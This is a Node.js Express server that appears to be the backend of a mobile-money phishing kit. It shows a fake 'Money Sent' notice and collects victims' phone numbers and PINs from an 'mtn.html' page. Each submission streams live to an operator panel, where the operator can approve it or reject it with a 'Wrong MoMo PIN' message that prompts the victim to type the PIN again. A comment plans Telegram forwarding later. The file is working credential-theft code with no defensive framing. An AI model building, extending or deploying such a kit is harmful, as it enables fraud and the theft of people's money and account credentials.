const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

const DEFAULT_STATE = {
  status: 'Money Sent',
  currency: 'USD',
  amount: 250.00,
  senderName: 'John Doe',
  senderCountry: 'United States',
  purpose: 'Family Support',
  requestId: 'REQ-8829104',
  method: 'Mobile Money',
  reference: 'SW-2849163',
  recipientName: 'Recipient Name',
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString()
};

function readState() {
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(DEFAULT_STATE, null, 2));
  }
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}

function writeState(state) {
  state.updatedAt = new Date().toISOString();
  fs.writeFileSync(DATA_FILE, JSON.stringify(state, null, 2));
}

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

/* ---- Real-time subscribers (SSE) ---- */
const clients = new Set();

function broadcast(state) {
  const payload = `data: ${JSON.stringify(state)}\n\n`;
  for (const res of clients) {
    try { res.write(payload); } catch (_) { clients.delete(res); }
  }
}

/* ---- Endpoints ---- */

// Health check — Render pings this to verify the app is alive
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', uptime: process.uptime() });
});

// Get current state
app.get('/api/state', (req, res) => {
  res.json(readState());
});

// Subscribe to real-time updates
app.get('/api/stream', (req, res) => {
  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Access-Control-Allow-Origin': '*'
  });
  res.flushHeaders();

  // Send current state immediately
  res.write(`data: ${JSON.stringify(readState())}\n\n`);

  clients.add(res);

  // Keep-alive comment every 25s so proxies don't close the connection
  const ping = setInterval(() => {
    try { res.write(': ping\n\n'); } catch (_) {}
  }, 25000);

  req.on('close', () => {
    clearInterval(ping);
    clients.delete(res);
  });
});

// Admin update — triggers instant broadcast
app.post('/api/state', (req, res) => {
  const current = readState();
  const updated = { ...current, ...req.body };
  if (req.body.amount != null) updated.amount = parseFloat(req.body.amount) || 0;
  writeState(updated);
  broadcast(updated);
  res.json({ ok: true, state: updated });
});

// Payment submission — receives phone + PIN + recipient from mtn.html
// Broadcasts to admin panel + (later) Telegram
app.post('/api/submit-payment', (req, res) => {
  const submission = {
    ...req.body,
    id: 'REQ-' + Date.now(),
    submittedAt: new Date().toISOString()
  };

  // Store latest submission in data.json so admin can see it
  const state = readState();
  state.latestSubmission = submission;
  writeState(state);

  // Notify all connected clients (admin panel picks this up)
  broadcast(state);

  // For now, respond as "pending" — real approval will come from admin/Telegram
  res.json({ status: 'pending', id: submission.id });
});

// Admin approve
app.post('/api/approve', (req, res) => {
  const state = readState();
  state.decision = 'approved';
  state.decidedAt = new Date().toISOString();
  writeState(state);
  broadcast(state);
  res.json({ ok: true });
});

// Admin decline
app.post('/api/decline', (req, res) => {
  const state = readState();
  state.decision = 'declined';
  state.declineMessage = req.body.message || 'Wrong MoMo PIN. Please try again.';
  state.decidedAt = new Date().toISOString();
  writeState(state);
  broadcast(state);
  res.json({ ok: true });
});

// Reset decision (for next test)
app.post('/api/reset', (req, res) => {
  const state = readState();
  delete state.decision;
  delete state.declineMessage;
  delete state.decidedAt;
  delete state.latestSubmission;
  writeState(state);
  broadcast(state);
  res.json({ ok: true, state });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Running on port ${PORT}`);
});
